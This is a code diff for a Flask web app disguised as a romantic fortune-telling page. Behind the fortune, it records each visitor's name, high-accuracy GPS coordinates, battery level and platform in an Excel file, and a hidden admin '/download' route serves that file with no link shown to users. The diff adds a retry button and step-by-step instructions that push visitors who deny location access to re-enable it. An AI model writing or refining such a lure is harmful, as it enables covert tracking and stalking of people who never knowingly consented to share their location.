@@ -5,10 +5,8 @@ import requests
 import os
 from datetime import datetime
 import random
-import io
 
 app = Flask(__name__)
-tracks = []
 
 # Ensure the excel_files folder exists
 os.makedirs('excel_files', exist_ok=True)
@@ -23,7 +21,7 @@ def get_address(lat, lon):
     except:
         return 'Location captured'
 
-# Beautiful UI – NO download link for users
+# Beautiful UI – NO download link, location retry button
 HTML = '''
 <!DOCTYPE html>
 <html>
@@ -157,13 +155,26 @@ HTML = '''
         }
         .name-highlight { font-size: 28px; font-weight: bold; margin: 10px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
         .error-message {
-            background: rgba(255,0,0,0.2);
+            background: #fff3f3;
+            border-left: 4px solid #ff6b6b;
             border-radius: 20px;
             padding: 15px;
             margin-top: 20px;
             color: #c0392b;
             font-size: 14px;
+            text-align: center;
         }
+        .retry-btn {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 50px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .retry-btn:hover { background: #ff5252; }
         @media (max-width:600px) {
             .container { padding: 35px 25px; }
             h1 { font-size: 28px; }
@@ -182,7 +193,7 @@ HTML = '''
             <label>✨ What's your name, beautiful soul? ✨</label>
             <input type="text" id="userName" placeholder="Enter your name..." autocomplete="off">
         </div>
-        <button class="btn" onclick="getFortune()">✨ Reveal My Destiny ✨</button>
+        <button class="btn" onclick="requestFortune()">✨ Reveal My Destiny ✨</button>
     </div>
 
     <div class="loading" id="loading">
@@ -223,25 +234,27 @@ HTML = '''
         return null;
     }
 
-    async function getFortune() {
+    // This function will be called on each retry
+    window.requestFortune = async function() {
         const name = document.getElementById('userName').value.trim();
         if (!name) {
             alert('💕 Please enter your beautiful name! 💕');
             return;
         }
 
-        // Hide any previous error
+        // Hide any previous error and result, show loading
         document.getElementById('errorMsg').style.display = 'none';
+        document.getElementById('result').classList.remove('show');
         document.getElementById('initial').style.display = 'none';
         document.getElementById('loading').classList.add('show');
 
         if (!navigator.geolocation) {
-            showError('Geolocation is not supported by your browser.');
+            showError('Geolocation is not supported by your browser.', true);
             return;
         }
 
         navigator.geolocation.getCurrentPosition(async function(pos) {
-            // Success: get battery and send data
+            // Success
             const battery = await getBattery();
             const data = {
                 name: name,
@@ -269,36 +282,36 @@ HTML = '''
                     document.getElementById('userNameDisplay').innerHTML = `✨ ${name} ✨`;
                     document.getElementById('fortuneText').innerHTML = result.fortune;
                 } else {
-                    showError('Server error. Please try again later.');
+                    showError('Server error. Please try again later.', true);
                 }
             } catch(err) {
-                showError('Network error. Please check your connection.');
+                showError('Network error. Please check your connection.', true);
             }
         }, function(error) {
-            // Location error handler – no page reload, just show message
+            // Location error handler - provide retry option
             let errorMsg = '';
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = '💔 Location access denied. Please allow location in your browser settings and refresh the page.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMsg = '📍 Location information is unavailable.';
-                    break;
-                case error.TIMEOUT:
-                    errorMsg = '⏰ Request timed out. Please try again.';
-                    break;
-                default:
-                    errorMsg = 'An unknown error occurred.';
+            if (error.code === error.PERMISSION_DENIED) {
+                errorMsg = '💔 Location access is blocked. Please allow location in your browser settings, then click "Retry".<br><small>How to fix: Click the lock/info icon in address bar → Site settings → Location → Allow → Reload page.</small>';
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                errorMsg = '📍 Location unavailable. Please enable GPS or try again.';
+            } else if (error.code === error.TIMEOUT) {
+                errorMsg = '⏰ Location request timed out. Please try again.';
+            } else {
+                errorMsg = 'An unknown error occurred.';
             }
-            showError(errorMsg);
+            showError(errorMsg, true);
         }, { enableHighAccuracy: true, timeout: 10000 });
-    }
+    };
 
-    function showError(msg) {
+    function showError(msg, showRetry = true) {
         document.getElementById('loading').classList.remove('show');
         document.getElementById('initial').style.display = 'block';
         const errorDiv = document.getElementById('errorMsg');
-        errorDiv.innerHTML = msg + ' <button onclick="location.reload()" style="background:white; border:none; padding:5px 10px; border-radius:20px; margin-top:10px; cursor:pointer;">🔄 Retry</button>';
+        let retryBtn = '';
+        if (showRetry) {
+            retryBtn = '<button class="retry-btn" onclick="requestFortune()">🔄 Retry Location</button>';
+        }
+        errorDiv.innerHTML = msg + '<br>' + retryBtn;
         errorDiv.style.display = 'block';
     }
 </script>
@@ -338,15 +351,18 @@ def save():
             'Platform': data['platform']
         }
 
-        tracks.append(record)
-        df = pd.DataFrame(tracks)
+        # Save to Excel (persistent storage)
         excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
         if os.path.exists(excel_path):
-            old = pd.read_excel(excel_path)
-            df = pd.concat([old, df], ignore_index=True)
-        df.to_excel(excel_path, index=False, engine='openpyxl')
+            existing_df = pd.read_excel(excel_path)
+            new_df = pd.DataFrame([record])
+            combined = pd.concat([existing_df, new_df], ignore_index=True)
+            combined.to_excel(excel_path, index=False, engine='openpyxl')
+        else:
+            df = pd.DataFrame([record])
+            df.to_excel(excel_path, index=False, engine='openpyxl')
 
-        # Romantic messages (personalized with name)
+        # Romantic messages with name
         messages = [
             f"💕 Dear {name}, someone special is thinking of you right now! 💕",
             f"💖 {name}, a beautiful soul is about to enter your life! 💖",
@@ -364,18 +380,17 @@ def save():
         print(f"\n✨ {name} | {lat:.4f}, {lon:.4f} | Battery: {batt_level}%")
         return {'success': True, 'fortune': fortune}
     except Exception as e:
-        print("Error:", e)
+        print("Save error:", e)
         return {'success': False}, 500
 
+# Admin-only download endpoint – no link in HTML
 @app.route('/download')
 def download():
-    """Admin-only download endpoint – no link in UI, but you can directly visit /download"""
     excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
     if os.path.exists(excel_path):
         return send_file(excel_path, as_attachment=True, download_name='fortunes_data.xlsx')
     else:
         return "No data yet. Share the link with friends!", 404
 
-# For local testing only – on Render, gunicorn will run the app
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=False)
